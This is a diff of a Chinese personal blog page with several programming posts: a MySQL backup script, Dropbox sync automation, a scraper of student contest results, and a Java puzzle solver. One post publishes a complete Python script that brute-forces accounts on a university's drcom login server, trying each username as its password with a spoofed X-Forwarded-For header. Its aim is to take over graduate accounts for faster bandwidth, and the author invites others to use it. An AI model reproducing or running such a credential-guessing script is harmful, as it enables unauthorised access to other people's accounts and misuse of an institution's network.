@@ -9,7 +9,7 @@
   <meta name="author" content="dawncold">
 
   
-  <meta name="description" content="&lt;p&gt;突然发现mysql无法用localhost连接进去，而用127.0.0.1可以。&lt;/p&gt; linux下是这样的，如果用localhost连接是走的socket路线，用127.0.0.1走的是tcp路线。 修改了php.ini中的mysql. &hellip;">
+  <meta name="description" content="本来做了个一个todo的app感觉python写web app真得好快啊，于是想加入一个user的功能，这样注册的用户就可以写自己的todo了，不过这么一加才感觉到web.py真不好用了，特别是session，还有templates也不怎么好用，官方的文档不知道为何也不给个完整版的， &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -84,6 +84,44 @@
       
   <header>
     
+      <h1 class="entry-title"><a href="/blog/2012/05/06/webpy-frameworks-is-not-convinent-to-use/">web.py真不好用</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-05-06T16:31:00+08:00" pubdate data-updated="true">May 6<span>th</span>, 2012</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>本来做了个一个todo的app感觉python写web app真得好快啊，于是想加入一个user的功能，这样注册的用户就可以写自己的todo了，不过这么一加才感觉到web.py真不好用了，特别是session，还有templates也不怎么好用，官方的文档不知道为何也不给个完整版的，api只是写出来了，但基本都不说是什么作用，想清楚知道运行机制那就得看源代码了，还好不“那么”长！</p>
+
+<p>哎，暂时就放一下web.py吧！到头来过度依赖框架绝对不是什么好事，嗯，不是什么好兆头现在的我！</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
       <h1 class="entry-title"><a href="/blog/2012/05/02/mysql-issue/">网站都挂掉了</a></h1>
     
     
@@ -107,14 +145,11 @@
   </header>
 
 
-  <div class="entry-content"><pre><code>        &lt;p&gt;突然发现mysql无法用localhost连接进去，而用127.0.0.1可以。&lt;/p&gt;
-</code></pre>
+  <div class="entry-content"><p>突然发现mysql无法用localhost连接进去，而用127.0.0.1可以。</p>
 
 <p>linux下是这样的，如果用localhost连接是走的socket路线，用127.0.0.1走的是tcp路线。</p>
 
-
 <p>修改了php.ini中的mysql.default_socket，值为mysql.sock的文件路径，重启php就好了，不过phpmyadmin的问题依然没有解决，我只是把连接主机换成了127.0.0.1暂时用着。</p>
-
 </div>
   
   
@@ -150,54 +185,40 @@
   </header>
 
 
-  <div class="entry-content"><pre><code>        &lt;p&gt;备份数据库的重要性不想多说了。&lt;/p&gt;
-</code></pre>
+  <div class="entry-content"><p>备份数据库的重要性不想多说了。</p>
 
-<br /><pre class="prettyprint linenums bush:python" lang="python">#! /usr/bin/env python
+<pre class="prettyprint linenums bush:python" lang="python">#! /usr/bin/env python
+# coding: utf-8
 
-
-<h1>coding: utf-8</h1>
-
-<p>import os
+import os
 import sys
 from datetime import *
-import time</p>
+import time
 
-<h1>mysql&rsquo;s path</h1>
+#mysql's path
+mysql_path = '/usr/local/mysql/bin/'
+#edit this if your mysql username and password is not like this:
+mysql_username = 'root'
+mysql_password = 'xxxxxx'
+#backup path
+backup_path = 'mysqlbackup/'
 
-<p>mysql_path = &lsquo;/usr/local/mysql/bin/&rsquo;</p>
+def validate_backup_path():
+if os.path.exists(backup_path) == False:
+print "I create a directory here: %s " % backup_path
+os.mkdir(backup_path)
 
-<h1>edit this if your mysql username and password is not like this:</h1>
+def backup_all_databases():
+filename = "all_%s.sql" % (datetime.utcfromtimestamp(time.time()))
+os.system("%smysqldump -u%s -p%s --all-databases &gt; '%s%s'" % (mysql_path, mysql_username, mysql_password, backup_path, filename))
 
-<p>mysql_username = &lsquo;root&rsquo;
-mysql_password = &lsquo;xxxxxx&rsquo;</p>
-
-<h1>backup path</h1>
-
-<p>backup_path = &lsquo;mysqlbackup/&rsquo;</p>
-
-<p>def validate_backup_path():</p>
-
-<pre><code>if os.path.exists(backup_path) == False:
-    print "I create a directory here: %s " % backup_path
-    os.mkdir(backup_path)
-</code></pre>
-
-<p>def backup_all_databases():</p>
-
-<pre><code>filename = "all_%s.sql" % (datetime.utcfromtimestamp(time.time()))
-os.system("%smysqldump -u%s -p%s --all-databases &amp;gt; '%s%s'" % (mysql_path, mysql_username, mysql_password, backup_path, filename))
-</code></pre>
-
-<p>if <strong>name</strong> == &ldquo;<strong>main</strong>&rdquo;:</p>
-
-<pre><code>validate_backup_path()
+if __name__ == "__main__":
+validate_backup_path()
 backup_all_databases()
-print "finish!!!"&lt;/pre&gt;
-</code></pre>
+print "finish!!!"</pre>
 
-<br /><p>这个是修改了一次的备份脚本，本来是分数据库备份的，无奈制定了分数据库备份需要输入密码，这就不容易加入cron来自动完成了，不过听说在my.cnf中加入mysqldump的设置可以避免输入账号密码，这也算是一个办法吧，不过还是本着简化的思想，只导出所有数据库出来就好，配合着上一篇的dropbox自动备份，这样VPS的灾备就稍稍好些了：）</p>
 
+<p>这个是修改了一次的备份脚本，本来是分数据库备份的，无奈制定了分数据库备份需要输入密码，这就不容易加入cron来自动完成了，不过听说在my.cnf中加入mysqldump的设置可以避免输入账号密码，这也算是一个办法吧，不过还是本着简化的思想，只导出所有数据库出来就好，配合着上一篇的dropbox自动备份，这样VPS的灾备就稍稍好些了：）</p>
 </div>
   
   
@@ -233,99 +254,80 @@ print "finish!!!"&lt;/pre&gt;
   </header>
 
 
-  <div class="entry-content"><pre><code>        &lt;p&gt;在&lt;a href="http://www.deepvps.com/dropbox-backup.html" target="_blank"&gt;这里&lt;/a&gt;看过的文章，感觉很不错，于是发表过来，但发现有点问题，我就自己再改改。&lt;/p&gt;
-</code></pre>
+  <div class="entry-content"><p>在<a href="http://www.deepvps.com/dropbox-backup.html" target="_blank">这里</a>看过的文章，感觉很不错，于是发表过来，但发现有点问题，我就自己再改改。</p>
 
 <p>安装linux下的dropbox（我的是32为系统，如果是64位在下面地址末尾加上“_64”即可）：</p>
 
-
-<br /><pre class="prettyprint linenums bush:bash" lang="bash">wget -O dropbox.tar.gz http://www.dropbox.com/download?plat=lnx.x86</pre>
-
-
-<br /><p>解压后在.dropbox-dist目录中有dropboxd可执行文件，让其在后台执行（就是在执行文件后面加“&amp;”符号）</p>
+<pre class="prettyprint linenums bush:bash" lang="bash">wget -O dropbox.tar.gz http://www.dropbox.com/download?plat=lnx.x86</pre>
 
 
-<br /><pre class="prettyprint linenums bush:bash" lang="bash">~/.dropbox-dist/dropboxd &amp;</pre>
+<p>解压后在.dropbox-dist目录中有dropboxd可执行文件，让其在后台执行（就是在执行文件后面加“&amp;”符号）</p>
+
+<pre class="prettyprint linenums bush:bash" lang="bash">~/.dropbox-dist/dropboxd &amp;</pre>
 
 
-<br /><p>此后会出现一个地址，你得复制出来然后在浏览器中打开，之后就是注册或者登陆dropbox，这样就激活了在这台机器上的dropbox，就可以同步文件了。</p>
-
+<p>此后会出现一个地址，你得复制出来然后在浏览器中打开，之后就是注册或者登陆dropbox，这样就激活了在这台机器上的dropbox，就可以同步文件了。</p>
 
 <p>把需要同步备份的文件软连接到Dropbox这个目录中：</p>
 
+<pre class="prettyprint linenums bush:bash" lang="bash">cd ~/Dropbox
+ln -s /home/wwwroot/
+。。。</pre>
 
-<br /><pre class="prettyprint linenums bush:bash" lang="bash">cd ~/Dropbox
 
-
-<p>ln -s /home/wwwroot/
-。。。</pre></p>
-
-<br /><p>此时dropbox已经在帮你同步了，你可以通过web端观察。</p>
-
+<p>此时dropbox已经在帮你同步了，你可以通过web端观察。</p>
 
 <p>我看到的文章中带着一个自动运行的脚本，用sh写的，我发现在主机上运行没反应，不会sh，会点python，于是我改写了一下，也是可用的：</p>
 
+<pre class="prettyprint linenums bush:python" lang="python">#! /usr/bin/env python
+# coding: utf-8
 
-<br /><pre class="prettyprint linenums bush:python" lang="python">#! /usr/bin/env python
+import sys
+import os
+
+def start():
+print "Starting Dropbox..."
+os.system("~/.dropbox-dist/dropboxd &amp;")
 
 
-<h1>coding: utf-8</h1>
-
-<p>import sys
-import os</p>
-
-<p>def start():</p>
-
-<pre><code>print "Starting Dropbox..."
-os.system("~/.dropbox-dist/dropboxd &amp;amp;")
-</code></pre>
-
-<p>def stop():</p>
-
-<pre><code>print "Stoping Dropbox..."
+def stop():
+print "Stoping Dropbox..."
 os.system("pkill dropbox")
-</code></pre>
 
-<p>def restart():</p>
 
-<pre><code>stop()
+def restart():
+stop()
 start()
-</code></pre>
 
-<p>if <strong>name</strong> == &ldquo;<strong>main</strong>&rdquo;:</p>
 
-<pre><code>action = sys.argv[1]
+if __name__ == "__main__":
+action = sys.argv[1]
 print "now action: %s" % action
 if action == 'start':
-    start()
+start()
 elif action == "stop":
-    stop()
+stop()
 elif action == "restart":
-    restart()
+restart()
 else:
-    print "Bad arguments!"&lt;/pre&gt;
-</code></pre>
-
-<br /><p>相应的crontab配置文件中这样写就好了：</p>
+print "Bad arguments!"</pre>
 
 
-<br /><pre class="prettyprint linenums bush:bash" lang="bash">#auto dropbox
+<p>相应的crontab配置文件中这样写就好了：</p>
+
+<pre class="prettyprint linenums bush:bash" lang="bash">#auto dropbox
+0 4 * * * python /root/dropbox.py restart
+0 5 * * * python /root/dropbox.py stop</pre>
 
 
-<p>0 4 * * * python /root/dropbox.py restart
-0 5 * * * python /root/dropbox.py stop</pre></p>
+<p>如果没装crontab（极少情况），这样(也许你用apt-get来做这件事，我的是centos系统，用yum了)：</p>
 
-<br /><p>如果没装crontab（极少情况），这样(也许你用apt-get来做这件事，我的是centos系统，用yum了)：</p>
-
-
-<br /><pre class="prettyprint linenums bush:bash" lang="bash">yum -y install crontab</pre>
+<pre class="prettyprint linenums bush:bash" lang="bash">yum -y install crontab</pre>
 
 
-<br /><p>python让我很快乐：）</p>
-
+<p>python让我很快乐：）</p>
 
 <p>一开始在python用的是exec来执行命令发现不可用，于是用了os.system，查看pydoc才发现exec是执行python code用的……惭愧！</p>
-
 </div>
   
   
@@ -361,68 +363,57 @@ else:
   </header>
 
 
-  <div class="entry-content"><pre><code>        &lt;p&gt;这些表格是所有参加比赛的学生成绩单，当然只有省份、学校、准考证、姓名、组别、奖项、是否进入决赛这几个列，我用python写的脚本来抓取，存入了本地的一个excel中，所以除了python环境之外还需要xlwt这个包包：）&lt;/p&gt;
-</code></pre>
+  <div class="entry-content"><p>这些表格是所有参加比赛的学生成绩单，当然只有省份、学校、准考证、姓名、组别、奖项、是否进入决赛这几个列，我用python写的脚本来抓取，存入了本地的一个excel中，所以除了python环境之外还需要xlwt这个包包：）</p>
 
-<br /><pre class="prettyprint linenums bush:python" lang="python">#/usr/bin/env python
+<pre class="prettyprint linenums bush:python" lang="python">#/usr/bin/env python
+#coding: utf-8
 
-
-<h1>coding: utf-8</h1>
-
-<p>import urllib2
+import urllib2
 import re
-import xlwt</p>
+import xlwt
 
-<p>link_list = []
+link_list = []
 xls = xlwt.Workbook()
-table = xls.add_sheet(&ldquo;main&rdquo;)</p>
+table = xls.add_sheet("main")
 
-<p>for i in xrange(288, 318):</p>
+for i in xrange(288, 318):
+link_list.append("http://www.lanqiao.org/Article/ShowArticle.asp?ArticleID=%d"%i)
 
-<pre><code>link_list.append("http://www.lanqiao.org/Article/ShowArticle.asp?ArticleID=%d"%i)
-</code></pre>
+chinese = []
+content = ''
+while len(link_list) &gt; 0:
+for link in link_list:
+print link
+try:
+content = urllib2.urlopen(url = link, timeout = 3).read()
+link_list = link_list[1:]
+except:
+print "timeout!"
+if link not in link_list[1:]:
+link_list.append(link)
+some = re.findall(u'&lt;TR.*?&lt;\/TR&gt;', content.decode('gbk', 'ignore'), re.S)
+for s in some:
+chinese_value = re.findall(u'(?&lt;=\u5b8b\u4f53&gt;).*(?=&lt;\/FONT&gt;)', s)
+chinese.append(','.join(chinese_value))
 
-<p>chinese = []
-content = &lsquo;&rsquo;
-while len(link_list) &gt; 0:</p>
-
-<pre><code>for link in link_list:
-    print link
-    try:
-        content = urllib2.urlopen(url = link, timeout = 3).read()
-        link_list = link_list[1:]
-    except:
-        print "timeout!"
-        if link not in link_list[1:]:
-            link_list.append(link)
-    some = re.findall(u'&amp;lt;TR.*?&amp;lt;\/TR&amp;gt;', content.decode('gbk', 'ignore'), re.S)
-    for s in some:
-        chinese_value = re.findall(u'(?&amp;lt;=\u5b8b\u4f53&amp;gt;).*(?=&amp;lt;\/FONT&amp;gt;)', s)
-        chinese.append(','.join(chinese_value))
-</code></pre>
-
-<p>for line in xrange(0, len(chinese)):</p>
-
-<pre><code>tmp = chinese[line].split(',')
+for line in xrange(0, len(chinese)):
+tmp = chinese[line].split(',')
 for i in xrange(0, len(tmp)):
-    table.write(line, i, tmp[i])
-    print "%d, %d, %s" % (line, i, tmp[i])
-</code></pre>
+table.write(line, i, tmp[i])
+print "%d, %d, %s" % (line, i, tmp[i])
 
-<p>xls.save(&lsquo;x.xls&rsquo;)
-print len(link_list)</pre></p>
+xls.save('x.xls')
+print len(link_list)</pre>
 
-<br /><p>链接抓取超时的时候会自动重新抓取，最终就有了一个叫x.xls的表格。其中有个省的数据有问题，可以在筛选中看到奖项这里面有个垃圾数据项，自己改改吧。</p>
 
+<p>链接抓取超时的时候会自动重新抓取，最终就有了一个叫x.xls的表格。其中有个省的数据有问题，可以在筛选中看到奖项这里面有个垃圾数据项，自己改改吧。</p>
 
 <p>里面的正则表达式耗费了我好久时间！！！不过我还是很欣慰能找到这行：</p>
 
+<pre class="prettyprint linenums bush:python" lang="python">(?&lt;=\u5b8b\u4f53&gt;).*(?=&lt;\/FONT&gt;)</pre>
 
-<br /><pre class="prettyprint linenums bush:python" lang="python">(?&lt;=\u5b8b\u4f53&gt;).*(?=&lt;\/FONT&gt;)</pre>
 
-
-<br /><p>前面两个unicode是“宋体”，这个得看具体的html代码了，所以这个脚本没什么通用性……</p>
-
+<p>前面两个unicode是“宋体”，这个得看具体的html代码了，所以这个脚本没什么通用性……</p>
 </div>
   
   
@@ -458,14 +449,11 @@ print len(link_list)</pre></p>
   </header>
 
 
-  <div class="entry-content"><pre><code>        &lt;p&gt;资格赛已经结束了，还好做出来几个题，现在来看这些题目都不算是特别有难度，最主要的还是在理解题目的要求，这当然对于我们非英语系国家的人来说是有些困难的，可能我们需要多读几遍题目才能开始编码，这确实有些不利，但最主要的还是理解错了题目，这样才可怕。&lt;/p&gt;
-</code></pre>
+  <div class="entry-content"><p>资格赛已经结束了，还好做出来几个题，现在来看这些题目都不算是特别有难度，最主要的还是在理解题目的要求，这当然对于我们非英语系国家的人来说是有些困难的，可能我们需要多读几遍题目才能开始编码，这确实有些不利，但最主要的还是理解错了题目，这样才可怕。</p>
 
 <p>第二个题我就理解有些问题，考虑得太多了，看优秀选手的代码，才十几行结束，真是羡慕死我了！！！</p>
 
-
 <p>下一轮比赛可能就要在家做了吧？毕竟到了我跑回家的日子：）</p>
-
 </div>
   
   
@@ -501,123 +489,116 @@ print len(link_list)</pre></p>
   </header>
 
 
-  <div class="entry-content"><pre><code>        &lt;p&gt;昨天参加了一个小型编程比赛，有个题目是这样的，有1～9这九个数字，按照顺序排列着，你可以在他们之间加入加号、减号或者什么都不加，组成的算式经过运算后结果为110的输出出来。&lt;/p&gt;
-</code></pre>
+  <div class="entry-content"><p>昨天参加了一个小型编程比赛，有个题目是这样的，有1～9这九个数字，按照顺序排列着，你可以在他们之间加入加号、减号或者什么都不加，组成的算式经过运算后结果为110的输出出来。</p>
 
 <p>看着好简单的题目，当时比赛时候就是一下子没做出来，现在做好了，贴出来，如果有需要可以拿去用哈，代码风格不算好，因为是比赛嘛，又不是商业项目，先快速得到结果再说！</p>
 
+<pre class="prettyprint linenums bush:java" lang="java">import java.util.ArrayList;
 
-<br /><pre class="prettyprint linenums bush:java" lang="java">import java.util.ArrayList;
 
-
-<p>public class unittest
-{</p>
-
-<pre><code>public static void main(String[] argStrings)
+public class unittest
 {
-    long start = System.currentTimeMillis();
-    ArrayList&amp;lt;String&amp;gt; allopts = new ArrayList&amp;lt;String&amp;gt;();
-    int a,b,c,d,e,f,g,h;
-    for(a = 0;a &amp;lt; 3;a++)
-        for(b = 0;b &amp;lt; 3;b++)
-            for(c = 0;c &amp;lt; 3;c++)
-                for(d = 0;d &amp;lt; 3;d++)
-                    for(e = 0;e &amp;lt; 3;e++)
-                        for(f = 0;f &amp;lt; 3;f++)
-                            for(g = 0;g &amp;lt; 3;g++)
-                                for(h = 0;h &amp;lt; 3;h++) {
-                                    allopts.add(""+a+b+c+d+e+f+g+h);
-                                }
-
-    for (String string : allopts)
-    {
-        String base = "1x2x3x4x5x6x7x8x9";
-        for (int i = 0; i &amp;lt; string.length(); i++)
-        {
-            String tmp = getOpt(Integer.parseInt(""+string.charAt(i)));
-            base = base.replaceFirst("x", tmp);
-        }
-        int x = getResult(base, string.replaceAll("2", "").replaceAll("0", "+").replaceAll("1", "-"));//2-&amp;gt;null
-        if (x == 110)
-        {
-            System.out.println(base);
-        }
-    }
-    System.out.println("All Run Time: " + (System.currentTimeMillis() - start) + "ms");
-}
-
-public static String getOpt(int opt) {
-    String retString = "";
-    switch (opt)
-    {
-        case 0:
-            retString = "+";
-            break;
-        case 1:
-            retString = "-";
-            break;
-        case 2:
-            retString = "";
-            break;
-        default:
-            break;
-    }
-
-    return retString;
-}
-
-public static int getResult(String calculatString, String optString)
-{
-    ArrayList&amp;lt;Integer&amp;gt; allNum = new ArrayList&amp;lt;Integer&amp;gt;();
-    ArrayList&amp;lt;String&amp;gt; allOpt = new ArrayList&amp;lt;String&amp;gt;();
-    for (String string : calculatString.split("[+-]"))
-    {
-        allNum.add(Integer.parseInt(string));
-    }
-    for (int i = 0; i &amp;lt; optString.length(); i++)
-    {
-        allOpt.add(optString.charAt(i) + "");
-    }
-    int result = allNum.get(0);
-    for (int i = 1; i &amp;lt; allNum.size(); i++)
-    {
-        char x = (i - 1) == allOpt.size()?'+':allOpt.get(i - 1).charAt(0);
-        int nextNum = i == allNum.size()?0:allNum.get(i);
-        result = getValue(result, nextNum, x);
-    }
-
-    return result;
-
-}
-
-public static int getValue(Integer num1, Integer num2, char opt)
-{
-    int ret = 0;
-    switch (opt)
-    {
-        case '+':
-            ret = num1 + num2;
-            break;
-        case '-':
-            ret = num1 - num2;
-            break;
-        default:
-            break;
-    }
-
-    return ret;
-}
-</code></pre>
-
-<p>}</pre></p>
-
-<br /><p>结果是这样的：</p>
+   public static void main(String[] argStrings)
+   {
+       long start = System.currentTimeMillis();
+       ArrayList&lt;String&gt; allopts = new ArrayList&lt;String&gt;();
+       int a,b,c,d,e,f,g,h;
+       for(a = 0;a &lt; 3;a++)
+           for(b = 0;b &lt; 3;b++)
+               for(c = 0;c &lt; 3;c++)
+                   for(d = 0;d &lt; 3;d++)
+                       for(e = 0;e &lt; 3;e++)
+                           for(f = 0;f &lt; 3;f++)
+                               for(g = 0;g &lt; 3;g++)
+                                   for(h = 0;h &lt; 3;h++) {
+                                       allopts.add(""+a+b+c+d+e+f+g+h);
+                                   }
+       
+       for (String string : allopts)
+       {
+           String base = "1x2x3x4x5x6x7x8x9";
+           for (int i = 0; i &lt; string.length(); i++)
+           {
+               String tmp = getOpt(Integer.parseInt(""+string.charAt(i)));
+               base = base.replaceFirst("x", tmp);
+           }
+           int x = getResult(base, string.replaceAll("2", "").replaceAll("0", "+").replaceAll("1", "-"));//2-&gt;null
+           if (x == 110)
+           {
+               System.out.println(base);
+           }
+       }
+       System.out.println("All Run Time: " + (System.currentTimeMillis() - start) + "ms");
+   }
+   
+   public static String getOpt(int opt) {
+       String retString = "";
+       switch (opt)
+       {
+           case 0:
+               retString = "+";
+               break;
+           case 1:
+               retString = "-";
+               break;
+           case 2:
+               retString = "";
+               break;
+           default:
+               break;
+       }
+       
+       return retString;
+   }
+   
+   public static int getResult(String calculatString, String optString)
+   {
+       ArrayList&lt;Integer&gt; allNum = new ArrayList&lt;Integer&gt;();
+       ArrayList&lt;String&gt; allOpt = new ArrayList&lt;String&gt;();
+       for (String string : calculatString.split("[+-]"))
+       {
+           allNum.add(Integer.parseInt(string));
+       }
+       for (int i = 0; i &lt; optString.length(); i++)
+       {
+           allOpt.add(optString.charAt(i) + "");
+       }
+       int result = allNum.get(0);
+       for (int i = 1; i &lt; allNum.size(); i++)
+       {
+           char x = (i - 1) == allOpt.size()?'+':allOpt.get(i - 1).charAt(0);
+           int nextNum = i == allNum.size()?0:allNum.get(i);
+           result = getValue(result, nextNum, x);
+       }
+       
+       return result;
+       
+   }
+   
+   public static int getValue(Integer num1, Integer num2, char opt)
+   {
+       int ret = 0;
+       switch (opt)
+       {
+           case '+':
+               ret = num1 + num2;
+               break;
+           case '-':
+               ret = num1 - num2;
+               break;
+           default:
+               break;
+       }
+       
+       return ret;
+   }
+}</pre>
 
 
-<br /><pre class="prettyprint linenums bush:bash" lang="bash">1+2+34+5+67-8+9
+<p>结果是这样的：</p>
 
-
-<p>1+234-56-78+9
+<pre class="prettyprint linenums bush:bash" lang="bash">1+2+34+5+67-8+9
+1+234-56-78+9
 1-2+3+45-6+78-9
 12+3+45+67-8-9
 12+34+56+7-8+9
@@ -627,10 +608,10 @@ public static int getValue(Integer num1, Integer num2, char opt)
 123-4+5-6-7+8-9
 123-4-5+6+7-8-9
 All Run Time: 496ms
-</pre></p>
+</pre>
 
-<br /><p>最后我算了算运行时间，应该这就是很慢的了，幸好只有加减和空，要不然会更麻烦的……</p>
 
+<p>最后我算了算运行时间，应该这就是很慢的了，幸好只有加减和空，要不然会更麻烦的……</p>
 </div>
   
   
@@ -666,132 +647,105 @@ All Run Time: 496ms
   </header>
 
 
-  <div class="entry-content"><pre><code>        &lt;p&gt;嗯，为何要猜研究生账号呢？是这样的，我们学校用的drcom控制网络访问，如果你用本科生账号，那么你最快下载速度也就是100kb/s，如果是老师、研究生账号呢，最快7Mb/s，这是什么差距你应该明白吧？！于是写了一个python的脚本来不断猜测研究生账号，但很可惜的是，猜出来的9个账号经过测试都还是有限速效果，真不知道这些账号是不是研究生账号呢？！！！可恶的学校啊！！！&lt;/p&gt;
-</code></pre>
+  <div class="entry-content"><p>嗯，为何要猜研究生账号呢？是这样的，我们学校用的drcom控制网络访问，如果你用本科生账号，那么你最快下载速度也就是100kb/s，如果是老师、研究生账号呢，最快7Mb/s，这是什么差距你应该明白吧？！于是写了一个python的脚本来不断猜测研究生账号，但很可惜的是，猜出来的9个账号经过测试都还是有限速效果，真不知道这些账号是不是研究生账号呢？！！！可恶的学校啊！！！</p>
 
-<br /><pre class="prettyprint linenums bush:python" lang="python">#! /usr/bin python
+<pre class="prettyprint linenums bush:python" lang="python">#! /usr/bin python
+# encoding: utf-8
 
-
-<h1>encoding: utf-8</h1>
-
-<p>import urllib2
+import urllib2
 import urllib
 import sys
-import types</p>
+import types
 
-<p>guess_list = []
-server_url = &ldquo;<a href="http://222.174.155.19/">http://222.174.155.19/</a>&rdquo;
-headers = { &lsquo;User-Agent&rsquo;            :   &lsquo;Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6&rsquo;,</p>
+guess_list = []
+server_url = "http://222.174.155.19/"
+headers = {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6',
+'X-Forwarded-For':'1.1.1.1'}
 
-<pre><code>'X-Forwarded-For'   :   '1.1.1.1'}
-</code></pre>
-
-<p>def usage():</p>
-
-<pre><code>print "USAGE 00: python guess.py FILEPATH of account list file,like: python guess.py ./lists.dat"
+def usage():
+print "USAGE 00: python guess.py FILEPATH of account list file,like: python guess.py ./lists.dat"
 print "USAGE 01: python guess.py START END like: python guess.py 2009123456 2009145396"
-</code></pre>
 
-<p>def Login(username, password):</p>
-
-<pre><code>params = urllib.urlencode({'DDDDD': username, 'upass': password, '0MKKey': "%B5%C7%C2%BC%20Login"})
+def Login(username, password):
+params = urllib.urlencode({'DDDDD': username, 'upass': password, '0MKKey': "%B5%C7%C2%BC%20Login"})
 request = urllib2.Request(url = server_url, data = params, headers = headers)
 try:
-    output = urllib2.urlopen(request, timeout = 3).readlines()
-    Log(output[5], username, password)
+output = urllib2.urlopen(request, timeout = 3).readlines()
+Log(output[5], username, password)
 except:
-    print "timeout!"
-    global guess_list
-    guess_list = guess_list[1:]
-    guess_list.append(username)
-</code></pre>
-
-<p>def Logout():</p>
-
-<pre><code>output = urllib2.urlopen(server_url + "F.htm")
-</code></pre>
-
-<p>def Log(output,username, password):</p>
-
-<pre><code># "msga='error1'" =&amp;gt; can not login in web
-result = output.find("msga='error1'")
-if result != -1:
-    print "find one!!!"
-    f = open("./content.dat", 'a')
-    f.write(str(username) + '\n')
-    f.close()
-else:
-    print "pass!"
-    f = open("./bad.dat",'a')
-    f.write(str(username) + '\n')
-    f.close()
-#drop first element 
+print "timeout!"
 global guess_list
 guess_list = guess_list[1:]
-</code></pre>
+guess_list.append(username)
 
-<p>def show_result():</p>
+def Logout():
+output = urllib2.urlopen(server_url + "F.htm")
 
-<pre><code>print "Result:##########################################"
+def Log(output,username, password):
+# "msga='error1'" =&gt; can not login in web
+result = output.find("msga='error1'")
+if result != -1:
+print "find one!!!"
+f = open("./content.dat", 'a')
+f.write(str(username) + '\n')
+f.close()
+else:
+print "pass!"
+f = open("./bad.dat",'a')
+f.write(str(username) + '\n')
+f.close()
+#drop first element
+global guess_list
+guess_list = guess_list[1:]
+
+def show_result():
+print "Result:##########################################"
 print "Have Guessed:"
 for i in open("./content.dat").readlines():
-    print i,
+print i,
 print "some accounts can not guessed are in bad.dat"
 print "Result:##########################################"
-</code></pre>
 
-<p>def get_timeout_list(timeout_file_path):</p>
-
-<pre><code>f = open(timeout_file_path)
+def get_timeout_list(timeout_file_path):
+f = open(timeout_file_path)
 global guess_list 
 guess_list = f.readlines()
 f.close()
-</code></pre>
 
-<p>if len(sys.argv) == 2:</p>
-
-<pre><code># itself and only one argv,the path of account list file...
+if len(sys.argv) == 2:
+# itself and only one argv,the path of account list file...
 get_timeout_list(sys.argv[1])
-</code></pre>
-
-<p>elif(len(sys.argv) &lt; 2):</p>
-
-<pre><code>usage()
-</code></pre>
-
-<p>else:</p>
-
-<pre><code>#start and end account,argv[1] and argv[2]
+elif(len(sys.argv) &lt; 2):
+usage()
+else:
+#start and end account,argv[1] and argv[2]
 start = int(sys.argv[1])
 end = int(sys.argv[2])
-if start &amp;gt; end:
-    usage()
-    exit(-1)
+if start &gt; end:
+usage()
+exit(-1)
 else:
-    guess_list = range(start, end + 1)
-</code></pre>
+guess_list = range(start, end + 1)
 
-<p>if <strong>name</strong> == &ldquo;<strong>main</strong>&rdquo;:</p>
+if __name__ == "__main__":
 
-<pre><code>while True:
-    for i in guess_list:
-        #drop last \n or \r
-        if type(i) == types.StringType:
-            i = i.rstrip('\n\r')
-        Logout()
-        print "Guess: " + str(i)
-        Login(i, i)
+while True:
+for i in guess_list:
+#drop last \n or \r
+if type(i) == types.StringType:
+i = i.rstrip('\n\r')
+Logout()
+print "Guess: " + str(i)
+Login(i, i)
 
-    if len(guess_list) == 0:
-        break
-show_result()&lt;/pre&gt;
-</code></pre>
+if len(guess_list) == 0:
+break
+show_result()</pre>
 
-<br /><p>主要就是用了drcom的网页登陆，当然大部分账号都是不能web登陆的啦，不过账号密码正确的话会弹出来一个提示，drcom是使用的js来显示的，于是我监测了是不是有“msga=&#8217;error1&#8217;”字符串，当然严格来讲还得监测是不是有&#8221;Msg=0&#8221;这个字符串才好，我就省略了……</p>
 
+<p>主要就是用了drcom的网页登陆，当然大部分账号都是不能web登陆的啦，不过账号密码正确的话会弹出来一个提示，drcom是使用的js来显示的，于是我监测了是不是有“msga=&lsquo;error1&#8217;”字符串，当然严格来讲还得监测是不是有&#8221;Msg=0&#8221;这个字符串才好，我就省略了……</p>
 
 <p>希望被drcom困扰的人们都能拿去用用，希望对你们有帮助！</p>
-
 </div>
   
   
@@ -827,17 +781,13 @@ show_result()&lt;/pre&gt;
   </header>
 
 
-  <div class="entry-content"><pre><code>        &lt;p&gt;着急回家就没带mbp，现在需要修改一下服务器上的文件，于是用了putty这款软件，一定要去官方下载啊，记得前一段时间爆发了在putty中嵌入木马从而盗取了N多服务器的root权限事件。&lt;/p&gt;
-</code></pre>
+  <div class="entry-content"><p>着急回家就没带mbp，现在需要修改一下服务器上的文件，于是用了putty这款软件，一定要去官方下载啊，记得前一段时间爆发了在putty中嵌入木马从而盗取了N多服务器的root权限事件。</p>
 
 <p>不过在用的时候发现查看带有中文字符的文件会出现乱码，在<a href="http://koda.iteye.com/blog/219494">这里</a>得到了解决方案：</p>
 
+<p><span style="font-family: Helvetica, Tahoma, Arial, sans-serif; line-height: 25px; text-align: left;">0.打开putty主程序，选择window-〉Appearance-〉Font settings-〉Change&hellip;,选择Fixedsys字体,字符集选择CHINESE_GB2312。 </span><br style="font-family: Helvetica, Tahoma, Arial, sans-serif; line-height: 25px; text-align: left;"><br style="font-family: Helvetica, Tahoma, Arial, sans-serif; line-height: 25px; text-align: left;"><span style="font-family: Helvetica, Tahoma, Arial, sans-serif; line-height: 25px; text-align: left;">1.在window-〉Appearance -〉Translation中，Received data assumed to be in which character set 中,把Use font encoding改为UTF-8如果经常使用,把这些设置保存在session里面. </span><br style="font-family: Helvetica, Tahoma, Arial, sans-serif; line-height: 25px; text-align: left;"><br style="font-family: Helvetica, Tahoma, Arial, sans-serif; line-height: 25px; text-align: left;"><span style="font-family: Helvetica, Tahoma, Arial, sans-serif; line-height: 25px; text-align: left;">2.现在打开putty,登录成功后,在shell中输入:export LC_ALL=&lsquo;zh_CN.utf8&#8217; </span></p>
 
